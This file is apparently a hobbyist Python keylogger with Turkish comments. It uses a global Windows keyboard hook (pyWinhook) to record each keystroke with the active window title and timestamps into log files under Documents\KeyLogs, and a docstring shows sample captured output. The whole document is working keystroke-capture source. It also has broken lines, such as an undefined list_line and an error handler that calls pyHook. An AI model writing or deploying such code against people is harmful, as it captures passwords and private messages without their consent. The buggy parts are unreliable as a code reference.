#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    import os, pyWinhook, pygame, atexit
    from datetime import datetime
except ImportError as ext:
    path = pyHook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(f" DLL dosyaları koypalanmalı!")
    print()
    print(f"     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print(f"     Kopyalanacağı dizin:")
    print(f"         C:\Windows\System32")
    quit()

#############################################
#               SABİT DEĞERLER              
#############################################

LVL_DEBUG = 2 # Tuş basımı dahil her bilgiyi gösterir 
LVL_INFO = 1  # Ek bilgileri de gösterir
LVL_NONE = 0  # Çıktı yok

#############################################
#            EVRENSEL DEĞİŞKENLER           
#############################################

LOG_ACTIVE = False
LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".log"
LOG_LVL = LVL_INFO
KEY_LIMIT = 1
SHORTCUT = (162, 164, 36) # CTRL + ALT + HOME

#############################################
#                FONKSİYONLAR               
#############################################

def parseData(event):
    keyData = []
    keyData.append(f"")
    keyData.append(f"UTC Time:    {datetime.utcnow()}")
    keyData.append(f"Boot Time:   {event.Time}")
    keyData.append(f"MessageName: {event.MessageName}")
    keyData.append(f"Message:     {event.Message}")
    keyData.append(f"Window:      {event.Window}")
    keyData.append(f"WindowName:  {event.WindowName}")
    keyData.append(f"Ascii:       {event.Ascii}")
    keyData.append(f"Key:         {event.Key}")
    keyData.append(f"KeyID:       {event.KeyID}")
    keyData.append(f"ScanCode:    {event.ScanCode}")
    keyData.append(f"Extended:    {event.Extended}")
    keyData.append(f"Injected:    {event.Injected}")
    keyData.append(f"Alt:         {event.Alt}")
    keyData.append(f"Transition:  {event.Transition}")
    keyData.append(f"")

    return keyData

def printKeyData(keyData):
    if LOG_LVL >= LVL_DEBUG:
        print("\n".join(keyData))


def logDirectly(keyData):
    try:
        CONTEXT_FILE.write("\n".join(keyData))
        CONTEXT_FILE.flush()
    except:
        pass


def logOnReach(keyData):

    def logListLines(list_keyData):
        for keyData in list_keyData:
            logDirectly(list_line)


    if not LOG_ACTIVE:
        return

    global list_keyData
    list_keyData.append(keyData)

    if len(list_keyData) > KEY_LIMIT:
        logListLines(list_keyData)

def resetShortCut():
    global list_press
    list_press = [False, False, False]

def refreshShortcutPress():
    global isShortcut
    for press in list_press:
        if not press:
            isShortcut = False
            return

    isShortcut = True

def onShortCutPressed():
    if LOG_LVL >= LVL_INFO:
        print("Kısayola basıldı")

# TODO: Keydown ile halledebilirsim
#       Her keye basıldığında -> True, çekildiğinde -> False
#       Hepsi true ise kısayol aktif demektir
#       Daha sağlıklı (ama yorucu 😢)
def handleShortcutPressed(event):
    if event.KeyID == SHORTCUT[len(SHORTCUT) - 1]:
        refreshShortcutPress()
        if isShortcut:
            onShortCutPressed()
            return
    elif isShortcut:
        resetShortCut()

    global list_press
    for i in range(len(SHORTCUT)):
        if not list_press[i]:
            if SHORTCUT[i] == event.KeyID:
                list_press[i] = True
                break
            else:
                resetShortCut()
                break

    refreshShortcutPress()
    if isShortcut:
        onShortCutPressed()
        resetShortCut()


def OnKeyboardEvent(event):
    handleShortcutPressed(event)

    keyData = parseData(event)
    printKeyData(keyData)

    if KEY_LIMIT <= 1:
        logDirectly(keyData)
    else:
        logOnReach(keyData)

    return True

def openFile():
    if not LOG_ACTIVE:
        return

    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

    return open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")

def onexit():
    try:
        CONTEXT_FILE.close()
    except:
        pass

def pumpMessage():
    pygame.init()
    while True:
        pygame.event.pump()

#############################################
#           PROGRAMIN ÇALIŞMA YERI
############################################# 

""" 
UTC Time:    2019-06-26 21:29:34.847890
Boot Time:   244593
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Lcontrol
KeyID:       162
ScanCode:    29
Extended:    0
Injected:    0
Alt:         0
Transition:  0

UTC Time:    2019-06-26 21:29:34.913715
Boot Time:   244656
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Lmenu
KeyID:       164
ScanCode:    56
Extended:    0
Injected:    0
Alt:         0
Transition:  0

UTC Time:    2019-06-26 21:29:35.060320
Boot Time:   244796
MessageName: key down
Message:     256
Window:      459330
WindowName:  KeyLogs
Ascii:       0
Key:         Home
KeyID:       36
ScanCode:    71
Extended:    1
Injected:    0
Alt:         0
Transition:  0 
"""

CONTEXT_FILE = openFile()
list_keyData = []
list_press = [False, False, False]
isShortcut = False

atexit.register(onexit) # TODO: Bunu nasıl aktif kılarım bilmiyorum

hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
